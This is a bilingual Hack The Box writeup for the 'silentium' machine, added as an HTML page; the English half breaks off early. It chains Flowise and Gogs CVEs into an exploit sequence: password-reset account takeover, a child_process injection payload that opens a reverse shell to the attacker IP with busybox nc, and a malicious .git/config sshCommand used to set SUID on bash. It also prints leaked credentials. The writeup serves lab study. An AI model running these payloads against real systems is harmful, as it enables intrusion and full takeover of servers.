@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>silentium | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">silentium</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ===================== ESPAÑOL ===================== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>La máquina expone un servicio <strong>Flowise</strong> en el subdominio
+                        <code>staging.silentium.htb</code>. La versión instalada (3.0.5) es vulnerable a varios CVEs
+                        encadenables. El punto de entrada comienza con la enumeración de usuarios a través del endpoint
+                        <code>/api/v1/account/forgot-password</code>, que responde de forma diferente dependiendo de si
+                        el email existe o no, permitiendo descubrir al usuario <code>ben@silentium.htb</code>.</p>
+
+                    <p>Con el usuario identificado, se abusa de <strong>CVE-2025-58434</strong>: el mismo endpoint
+                        devuelve en la respuesta un <code>tempToken</code> válido que puede usarse directamente en
+                        <code>/api/v1/account/reset-password</code> para resetear la contraseña sin ninguna
+                        verificación adicional, lo que constituye una toma de control de cuenta (<em>Account
+                        Takeover</em>).</p>
+
+                    <p>Una vez autenticados, se explota <strong>CVE-2025-59528</strong>, un RCE autenticado en el
+                        endpoint <code>/api/v1/node-load-method/customMCP</code> que permite inyectar código JavaScript
+                        arbitrario mediante un campo de configuración no saneado. Esto otorga acceso a un contenedor
+                        Docker donde las variables de entorno filtran la contraseña SMTP
+                        (<code>SMTP_PASSWORD=r04D!!_R4ge</code>), que resulta ser también la contraseña SSH del usuario
+                        <code>ben</code> en el host.</p>
+
+                    <p>Ya en el host, se descubre un servicio <strong>Gogs</strong> corriendo en el puerto local 3001.
+                        La versión instalada (0.13.3) es vulnerable a <strong>CVE-2025-64111</strong>, un RCE mediante
+                        un ataque de symlink que permite sobrescribir el archivo <code>.git/config</code> de un
+                        repositorio con contenido controlado por el atacante, inyectando una directiva
+                        <code>sshCommand</code> arbitraria que se ejecuta como <code>root</code>. Esto se aprovecha
+                        para asignar el bit SUID a <code>/bin/bash</code> y escalar privilegios.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo nmap para identificar los puertos y servicios expuestos en la máquina
+                    objetivo:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>   <span style="color:#e06c75;">STATE</span> <span style="color:#e06c75;">SERVICE</span> <span style="color:#e06c75;">VERSION</span>
+<span style="color:#98c379;">22/tcp</span>  open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+<span style="color:#98c379;">80/tcp</span>  open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://silentium.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Solo dos puertos: SSH en el 22 y un servidor web nginx en el 80. El servidor HTTP redirige a
+                    <code>silentium.htb</code>, así que lo añado al <code>/etc/hosts</code>.</p>
+
+                <p>La web principal parece una landing estática sin interacción con un backend:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">whatweb</span> http://silentium.htb</code></pre>
+
+                <pre><code class="language-plaintext">http://silentium.htb [200 OK] Country[RESERVED][ZZ], HTML5,
+HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.28.46],
+Script, Title[Silentium | Institutional Capital &amp; Lending Solutions], nginx[1.24.0]</code></pre>
+
+                <p>Nada relevante. Procedo con fuzzing de virtual hosts para encontrar subdominios:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">gobuster</span> vhost \
+  -u http://silentium.htb \
+  -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt \
+  -t 200 --append-domain --ne --xs 301 -r</code></pre>
+
+                <pre><code class="language-plaintext">staging.silentium.htb   Status: 200 [Size: 3142]</code></pre>
+
+                <p>Encuentro el subdominio <code>staging.silentium.htb</code>, que aloja un servicio
+                    <a href="https://github.com/flowiseai/flowise">Flowise</a>, una plataforma de automatización de
+                    flujos con IA.</p>
+
+                <h2>Enumeración de Flowise — Identificación de versión y usuario</h2>
+                <p>Flowise expone la versión instalada sin autenticación en el endpoint
+                    <code>/api/v1/version</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> http://staging.silentium.htb/api/v1/version</code></pre>
+
+                <pre><code class="language-json"><span style="color:#e5c07b;">{"version"</span>: <span style="color:#98c379;">"3.0.5"</span>}</code></pre>
+
+                <p>La versión <strong>3.0.5</strong> tiene varias vulnerabilidades conocidas. La más interesante es un
+                    RCE autenticado (<a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p">CVE-2025-59528</a>),
+                    pero requiere estar autenticado. Para autenticarme necesito un usuario válido.</p>
+
+                <p>El endpoint <code>/api/v1/account/forgot-password</code> devuelve respuestas distintas según si el
+                    email existe o no, lo que permite una enumeración de usuarios. Fuzzeando con
+                    <code>wfuzz</code> (a un solo hilo para evitar errores 500 por sobrecarga del endpoint)
+                    encuentro al usuario <code>ben</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">wfuzz</span> -c \
+  -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+  -X POST \
+  -u http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -d <span style="color:#98c379;">'{"user": {"email": "FUZZ@silentium.htb"}}'</span> \
+  -t 1 --hc 404</code></pre>
+
+                <pre><code class="language-plaintext">=====================================================================
+ID      Response   Lines  Word       Chars       Payload
+=====================================================================
+000000485:   201    0 L    1 W        579 Ch      "ben"</code></pre>
+
+                <p>El email del usuario es <code>ben@silentium.htb</code>.</p>
+
+                <h2>Account Takeover — CVE-2025-58434</h2>
+                <p>La vulnerabilidad <a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph">CVE-2025-58434</a>
+                    afecta al flujo de recuperación de contraseña de Flowise. El endpoint
+                    <code>/api/v1/account/forgot-password</code> no solo acepta el email, sino que devuelve en la
+                    respuesta el <code>tempToken</code> generado para el reset, sin enviarlo únicamente por correo.
+                    Esto permite a cualquiera que conozca el email tomar el control de la cuenta sin acceso al buzón
+                    de correo.</p>
+
+                <p>Primero obtengo el token llamando al endpoint de forgot-password:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -d <span style="color:#98c379;">'{"user": {"email": "ben@silentium.htb"}}'</span> | jq</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"user"</span>: {
+    <span style="color:#e06c75;">"id"</span>: <span style="color:#98c379;">"e26c9d6c-678c-4c10-9e36-01813e8fea73"</span>,
+    <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"admin"</span>,
+    <span style="color:#e06c75;">"email"</span>: <span style="color:#98c379;">"ben@silentium.htb"</span>,
+    <span style="color:#e06c75;">"credential"</span>: <span style="color:#98c379;">"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG"</span>,
+    <span style="color:#e06c75;">"tempToken"</span>: <span style="color:#98c379;">"4jYKhemtPMKU1ggD3hKe9iVwV9hMKxRi7veXovvcsdT6CsqN4MPxakremzzBBnPn"</span>,
+    <span style="color:#e06c75;">"tokenExpiry"</span>: <span style="color:#98c379;">"2026-04-12T11:22:00.937Z"</span>,
+    <span style="color:#e06c75;">"status"</span>: <span style="color:#98c379;">"active"</span>
+  },
+  <span style="color:#e06c75;">"organization"</span>: {},
+  <span style="color:#e06c75;">"organizationUser"</span>: {},
+  <span style="color:#e06c75;">"workspace"</span>: {},
+  <span style="color:#e06c75;">"workspaceUser"</span>: {},
+  <span style="color:#e06c75;">"role"</span>: {}
+}</code></pre>
+
+                <p>La respuesta devuelve directamente el <code>tempToken</code>. Ahora lo uso en el endpoint
+                    <code>/api/v1/account/reset-password</code> para establecer una contraseña nueva:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X POST http://staging.silentium.htb/api/v1/account/reset-password \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -d <span style="color:#98c379;">'{"user": {"tempToken": "4Du0efFnPwYArB1t0VFcdvA8uU3FJck1zjpdqc8iP7kKZEj0PPZy3kWsxcBkzVHx", "email": "ben@silentium.htb", "password": "asd"}}'</span> | jq</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"user"</span>: {
+    <span style="color:#e06c75;">"id"</span>: <span style="color:#98c379;">"e26c9d6c-678c-4c10-9e36-01813e8fea73"</span>,
+    <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"admin"</span>,
+    <span style="color:#e06c75;">"email"</span>: <span style="color:#98c379;">"ben@silentium.htb"</span>,
+    <span style="color:#e06c75;">"credential"</span>: <span style="color:#98c379;">"$2a$05$HuYiYdD1I4iosjC2Bkn7kefp9gL8icIaOp8CB09toWh6VAcLnzuA6"</span>,
+    <span style="color:#e06c75;">"tempToken"</span>: <span style="color:#98c379;">""</span>,
+    <span style="color:#e06c75;">"tokenExpiry"</span>: <span style="color:#98c379;">null</span>,
+    <span style="color:#e06c75;">"status"</span>: <span style="color:#98c379;">"active"</span>
+  },
+  <span style="color:#e06c75;">"organization"</span>: {},
+  <span style="color:#e06c75;">"organizationUser"</span>: {},
+  <span style="color:#e06c75;">"workspace"</span>: {},
+  <span style="color:#e06c75;">"workspaceUser"</span>: {},
+  <span style="color:#e06c75;">"role"</span>: {}
+}</code></pre>
+
+                <p>El <code>tempToken</code> queda vacío y el hash de la contraseña ha cambiado: el reset ha
+                    funcionado. Ahora puedo acceder a Flowise con las credenciales
+                    <code>ben@silentium.htb</code> / <code>asd</code>.</p>
+
+                <h2>RCE en Flowise — CVE-2025-59528</h2>
+                <p>Con acceso autenticado, procedo a explotar
+                    <a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p">CVE-2025-59528</a>.
+                    Esta vulnerabilidad permite la ejecución de código JavaScript arbitrario en el servidor a través
+                    del endpoint <code>/api/v1/node-load-method/customMCP</code>. El campo
+                    <code>mcpServerConfig</code> en el cuerpo de la petición no es saneado correctamente y permite
+                    inyectar y ejecutar código Node.js directamente en el proceso de Flowise.</p>
+
+                <p>Para ello necesito primero obtener la API key desde el panel web en
+                    <code>http://staging.silentium.htb/apikey</code>. Con ella, verifico la ejecución de código
+                    enviando un <code>curl</code> a mi máquina:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -H <span style="color:#98c379;">"Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc"</span> \
+  -d <span style="color:#98c379;">'{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"curl 10.10.14.208\");return 1;})()"}}}'</span> | jq</code></pre>
+
+                <pre><code class="language-json">[
+  {
+    <span style="color:#e06c75;">"label"</span>: <span style="color:#98c379;">"No Available Actions"</span>,
+    <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"error"</span>,
+    <span style="color:#e06c75;">"description"</span>: <span style="color:#98c379;">"No available actions, please check your API key and refresh"</span>
+  }
+]</code></pre>
+
+                <p>La respuesta de error es la esperada según la PoC. Lo importante es que en mi servidor HTTP
+                    recibo la petición de la máquina víctima, confirmando la ejecución remota de código:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">python3</span> -m http.server 80</code></pre>
+
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.28.24 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>Confirmado el RCE, me envío una reverse shell con <code>busybox nc</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -H <span style="color:#98c379;">"Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc"</span> \
+  -d <span style="color:#98c379;">'{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"busybox nc 10.10.14.208 443 -e sh\");return 1;})()"}}}'</span> | jq</code></pre>
+
+                <h2>Dentro del contenedor — Filtración de credenciales</h2>
+                <p>La shell llega a un contenedor Docker con pocos recursos. En <code>/tmp</code> hay algunos
+                    archivos que parecen indicar que el contenedor fue comprometido previamente como parte del
+                    diseño de la máquina:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> -lah /tmp</code></pre>
+
+                <pre><code class="language-plaintext">total 20K
+drwxrwxrwt 1 root root 4.0K Apr  8 09:41 .
+drwxr-xr-x 1 root root 4.0K Apr 12 11:25 ..
+-rwxr-xr-x 1 root root   32 Jan 29 22:27 code.sh
+-rw-r--r-- 1 root root   42 Jan 29 22:31 rce.sh
+-rwxr-xr-x 1 root root   42 Jan 29 22:34 rev.sh</code></pre>
+
+                <p>Ejecutando <code>env</code> veo las variables de entorno del contenedor, que filtran
+                    credenciales sensibles inyectadas en tiempo de despliegue:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">FLOWISE_PASSWORD</span>=F1l3_d0ck3r
+ALLOW_UNAUTHORIZED_CERTS=true
+NODE_VERSION=20.19.4
+HOSTNAME=c78c3cceb7ba
+YARN_VERSION=1.22.22
+<span style="color:#e06c75;">SMTP_PORT</span>=1025
+SHLVL=3
+PORT=3000
+HOME=/root
+<span style="color:#e06c75;">SENDER_EMAIL</span>=ben@silentium.htb
+PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
+JWT_ISSUER=ISSUER
+JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+LLM_PROVIDER=nvidia-nim
+<span style="color:#e06c75;">SMTP_USERNAME</span>=test
+SMTP_SECURE=false
+JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
+<span style="color:#e06c75;">FLOWISE_USERNAME</span>=ben
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+DATABASE_PATH=/root/.flowise
+JWT_TOKEN_EXPIRY_IN_MINUTES=360
+JWT_AUDIENCE=AUDIENCE
+SECRETKEY_PATH=/root/.flowise
+PWD=/
+<span style="color:#98c379;">SMTP_PASSWORD</span>=<span style="color:#98c379;">r04D!!_R4ge</span>
+NVIDIA_NIM_LLM_MODE=managed
+SMTP_HOST=mailhog
+JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+SMTP_USER=test</code></pre>
+
+                <p>La variable <code>SMTP_PASSWORD=r04D!!_R4ge</code> resulta ser también la contraseña SSH del
+                    usuario <code>ben</code> en el host. La pruebo y funciona, obteniendo así la flag de usuario:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ssh</span> ben@silentium.htb</code></pre>
+
+                <h2>Enumeración del host — Puerto 3001 y Gogs</h2>
+                <p>Una vez en el host, enumero los puertos en escucha localmente:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN 0  4096  127.0.0.1:3000    0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.1:3001    0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.54:53     0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.1:1025    0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.53%lo:53  0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.1:44931   0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.1:8025</code></pre>
+
+                <p>El puerto 3001 me llama especialmente la atención, y confirmo que se trata de un servicio
+                    <a href="https://github.com/gogs/gogs">Gogs</a> al ver una carpeta <code>gogs</code> bajo
+                    <code>/opt</code>. Compruebo la versión:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">/opt/gogs/gogs/gogs</span> --version</code></pre>
+
+                <pre><code class="language-plaintext">Gogs version 0.13.3</code></pre>
+
+                <p>La versión <strong>0.13.3</strong> es vulnerable a
+                    <a href="https://github.com/gogs/gogs/security/advisories/GHSA-gg64-xxr9-qhjp">CVE-2025-64111</a>,
+                    un RCE autenticado que permite ejecutar comandos arbitrarios como el usuario que corre el
+                    proceso de Gogs (en este caso, <code>root</code>).</p>
+
+                <h2>RCE en Gogs — CVE-2025-64111</h2>
+                <p>La vulnerabilidad explota un ataque de enlace simbólico (<em>symlink attack</em>) combinado con
+                    la API de contenidos de Gogs. El flujo es el siguiente:</p>
+
+                <ol>
+                    <li>Se crea un repositorio en Gogs y localmente.</li>
+                    <li>Se crea un symlink que apunta a <code>.git/config</code> y se sube al repositorio.</li>
+                    <li>Mediante la API de Gogs, se actualiza el contenido del archivo que apunta el symlink,
+                        escribiendo un <code>.git/config</code> malicioso con una directiva
+                        <code>sshCommand</code> arbitraria.</li>
+                    <li>Cuando Gogs procesa el repositorio internamente y ejecuta operaciones git con SSH, el
+                        comando inyectado se ejecuta con los privilegios del proceso Gogs.</li>
+                </ol>
+
+                <p>Primero registro un usuario en Gogs (los registros están abiertos) y creo un repositorio llamado
+                    <code>asd</code>. Luego, en el host, preparo el repositorio local y subo el symlink:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ln</span> -s .git/config link
+<span style="color:#61afef;">git</span> add link
+<span style="color:#61afef;">git</span> commit -m <span style="color:#98c379;">'add'</span> &amp;&amp; git push</code></pre>
+
+                <pre><code class="language-plaintext">[master (root-commit) 310c66e] add
+ 1 file changed, 1 insertion(+)
+ create mode 120000 link
+Enumerating objects: 3, done.
+Counting objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 202 bytes | 202.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+To http://localhost:3001/asd/asd.git
+ * [new branch]      master -> master</code></pre>
+
+                <p>El repositorio ahora contiene <code>link</code>, un symlink hacia <code>.git/config</code>, visible en la interfaz web de Gogs:</p>
+
+                <p><img src="./media/image1.png" alt="Interfaz web de Gogs mostrando el repositorio con el enlace simbólico 'link' apuntando a .git/config subido correctamente" /></p>
+
+                <p>Ahora genero un access token en Gogs para poder interactuar con la API. Con él, envío el
+                    request que sobreescribe el contenido del symlink (y por tanto el <code>.git/config</code>
+                    del repositorio) con un payload malicioso en base64:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X PUT http://localhost:3001/api/v1/repos/asd/asd/contents/link \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -H <span style="color:#98c379;">"Host: localhost:3001"</span> \
+  -H <span style="color:#98c379;">"Authorization: token e4a7c7a99bef9d3e591b5b2028d46069c87895a1"</span> \
+  -d <span style="color:#98c379;">'{"message":"message","committer":{"name":"test","email":"a@b.com"},"content":"W2NvcmVdCglyZXBvc2l0b3J5Zm9ybWF0dmVyc2lvbiA9IDAKCWZpbGVtb2RlID0gdHJ1ZQoJYmFyZSA9IGZhbHNlCglsb2dhbGxyZWZ1cGRhdGVzID0gdHJ1ZQoJaWdub3JlY2FzZSA9IHRydWUKCXByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQoJc3NoQ29tbWFuZCA9IHRvdWNoIC90bXAvYWJjCltyZW1vdGUgIm9yaWdpbiJdCgl1cmwgPSBzc2g6Ly9naXRAbG9jYWxob3N0L2RlbW8vdnVsLmdpdAoJZmV0Y2ggPSArcmVmcy9oZWFkcy8qOnJlZnMvcmVtb3Rlcy9vcmlnaW4vKgpbYnJhbmNoICJtYXN0ZXIiXQoJcmVtb3RlID0gb3JpZ2luCgltZXJnZSA9IHJlZnMvaGVhZHMvbWFzdGVy"}'</span></code></pre>
+
+                <pre><code class="language-json">{<span style="color:#e06c75;">"message"</span>:<span style="color:#98c379;">"Something went wrong, please check the server logs for more information."</span>,<span style="color:#e06c75;">"url"</span>:<span style="color:#98c379;">"https://github.com/gogs/docs-api"</span>}</code></pre>
+
+                <p>A pesar del mensaje de error, la PoC ha tenido éxito. Verifico que se ha creado el archivo
+                    <code>/tmp/abc</code> propiedad de <code>root</code>:</p>
+
+                <pre><code class="language-plaintext">-rw-r--r-- 1 root root 0 Apr 12 12:51 abc</code></pre>
+
+                <p>El payload base64 enviado decodifica al siguiente <code>.git/config</code> malicioso, donde la
+                    clave <code>sshCommand</code> inyecta el comando que se ejecuta cuando Gogs realiza operaciones
+                    git internas:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">echo</span> <span style="color:#98c379;">"W2NvcmVdCglyZXBvc2l0b3J5Zm9ybWF0dmVyc2lvbiA9IDAKCWZpbGVtb2RlID0gdHJ1ZQoJYmFyZSA9IGZhbHNlCglsb2dhbGxyZWZ1cGRhdGVzID0gdHJ1ZQoJaWdub3JlY2FzZSA9IHRydWUKCXByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQoJc3NoQ29tbWFuZCA9IHRvdWNoIC90bXAvYWJjCltyZW1vdGUgIm9yaWdpbiJdCgl1cmwgPSBzc2g6Ly9naXRAbG9jYWxob3N0L2RlbW8vdnVsLmdpdAoJZmV0Y2ggPSArcmVmcy9oZWFkcy8qOnJlZnMvcmVtb3Rlcy9vcmlnaW4vKgpbYnJhbmNoICJtYXN0ZXIiXQoJcmVtb3RlID0gb3JpZ2luCgltZXJnZSA9IHJlZnMvaGVhZHMvbWFzdGVy"</span> | base64 -d</code></pre>
+
+                <pre><code class="language-ini"><span style="color:#e5c07b;">[core]</span>
+    <span style="color:#e06c75;">repositoryformatversion</span> = <span style="color:#98c379;">0</span>
+    <span style="color:#e06c75;">filemode</span> = <span style="color:#98c379;">true</span>
+    <span style="color:#e06c75;">bare</span> = <span style="color:#98c379;">false</span>
+    <span style="color:#e06c75;">logallrefupdates</span> = <span style="color:#98c379;">true</span>
+    <span style="color:#e06c75;">ignorecase</span> = <span style="color:#98c379;">true</span>
+    <span style="color:#e06c75;">precomposeunicode</span> = <span style="color:#98c379;">true</span>
+    <span style="color:#e06c75;">sshCommand</span> = <span style="color:#c678dd;">touch /tmp/abc</span>
+<span style="color:#e5c07b;">[remote "origin"]</span>
+    <span style="color:#e06c75;">url</span> = <span style="color:#98c379;">ssh://git@localhost/demo/vul.git</span>
+    <span style="color:#e06c75;">fetch</span> = <span style="color:#98c379;">+refs/heads/*:refs/remotes/origin/*</span>
+<span style="color:#e5c07b;">[branch "master"]</span>
+    <span style="color:#e06c75;">remote</span> = <span style="color:#98c379;">origin</span>
+    <span style="color:#e06c75;">merge</span> = <span style="color:#98c379;">refs/heads/master</span></code></pre>
+
+                <p>La directiva <code>sshCommand</code> es la que git utiliza como binario SSH al conectarse a
+                    repositorios remotos vía SSH. Al inyectarla en el <code>.git/config</code> del repositorio
+                    gestionado por Gogs, cualquier operación interna que Gogs realice sobre ese repositorio con
+                    una URL SSH dispara el comando arbitrario con los privilegios del proceso.</p>
+
+                <h2>Escalada de Privilegios — Bit SUID en bash</h2>
+                <p>Con el RCE confirmado, modifico el payload para que en lugar de <code>touch /tmp/abc</code>,
+                    el comando inyectado sea <code>chmod u+s /bin/bash</code>. Creo un nuevo repositorio
+                    (<code>xd</code>), repito los pasos del symlink y envío el nuevo request:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X PUT http://localhost:3001/api/v1/repos/asd/xd/contents/link \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -H <span style="color:#98c379;">"Host: localhost:3001"</span> \
+  -H <span style="color:#98c379;">"Authorization: token e4a7c7a99bef9d3e591b5b2028d46069c87895a1"</span> \
+  -d <span style="color:#98c379;">'{"message":"message","committer":{"name":"test","email":"a@b.com"},"content":"W2NvcmVdCiAgICAgICAgcmVwb3NpdG9yeWZvcm1hdHZlcnNpb24gPSAwCiAgICAgICAgZmlsZW1vZGUgPSB0cnVlCiAgICAgICAgYmFyZSA9IGZhbHNlCiAgICAgICAgbG9nYWxscmVmdXBkYXRlcyA9IHRydWUKICAgICAgICBpZ25vcmVjYXNlID0gdHJ1ZQogICAgICAgIHByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQogICAgICAgIHNzaENvbW1hbmQgPSBjaG1vZCB1K3MgL2Jpbi9iYXNoCltyZW1vdGUgIm9yaWdpbiJdCiAgICAgICAgdXJsID0gc3NoOi8vZ2l0QGxvY2FsaG9zdC9kZW1vL3Z1bC5naXQKICAgICAgICBmZXRjaCA9ICtyZWZzL2hlYWRzLyo6cmVmcy9yZW1vdGVzL29yaWdpbi8qClticmFuY2ggIm1hc3RlciJdCiAgICAgICAgcmVtb3RlID0gb3JpZ2luCiAgICAgICAgbWVyZ2UgPSByZWZzL2hlYWRzL21hc3Rlcgo="}'</span></code></pre>
+
+                <p>Compruebo que el bit SUID se ha asignado correctamente a <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-plaintext">-rwsrwxrwx 1 root root 1.4M Mar 31 2024 /bin/bash</code></pre>
+
+                <p>Con el bit SUID activo, escalo privilegios ejecutando bash en modo privilegiado con
+                    <code>-p</code>, que preserva el EUID del propietario del binario (<code>root</code>):</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">bash</span> -p</code></pre>
+
+                <p>Obtengo una shell como <code>root</code> y consigo la flag del sistema.</p>
+            </div>
+
+            <!-- ===================== ENGLISH ===================== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The machine exposes a <strong>Flowise</strong> service on the subdomain
+                        <code>staging.silentium.htb</code>. The installed version (3.0.5) is vulnerable to several
+                        chainable CVEs. The entry point begins with user enumeration through the
+                        <code>/api/v1/account/forgot-password</code> endpoint, which responds differently depending
+                        on whether the email exists, allowing discovery of user <code>ben@silentium.htb</code>.</p>
+
+                    <p>With the user identified, <strong>CVE-2025-58434</strong> is abused: that same endpoint
+                        returns a valid <code>tempToken</code> in the response body that can be used directly against
+                        <code>/api/v1/account/reset-password</code> to reset the password without any further
+                        verification — a full Account Takeover.</p>
+
+                    <p>Once authenticated, <strong>CVE-2025-59528</strong> is exploited — an authenticated RCE on the
+                        <code>/api/v1/node-load-method/customMCP</code> endpoint that allows injecting arbitrary
+                        JavaScript via an unsanitized configuration field. This grants access to a Docker container
+                        where environment variables leak the SMTP password
+                        (<code>SMTP_PASSWORD=r04D!!_R4ge</code>), which also serves as the SSH password for user
+                        <code>ben</code> on the host.</p>
+
+                    <p>On the host, a <strong>Gogs</strong> service is discovered listening on local port 3001.
+                        Version 0.13.3 is vulnerable to <strong>CVE-2025-64111</strong>, an RCE via a symlink attack
+                        that allows overwriting a repository's <code>.git/config</code> with attacker-controlled
+                        content, injecting an arbitrary <code>sshCommand</code> directive executed as
+                        <code>root</code>. This is leveraged to set the SUID bit on <code>/bin/bash</code> and
+                        escalate privileges.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services on the target:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>   <span style="color:#e06c75;">STATE</span> <span style="color:#e06c75;">SERVICE</span> <span style="color:#e06c75;">VERSION</span>
+<span style="color:#98c379;">22/tcp</span>  open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+<span style="color:#98c379;">80/tcp</span>  open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://silentium.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
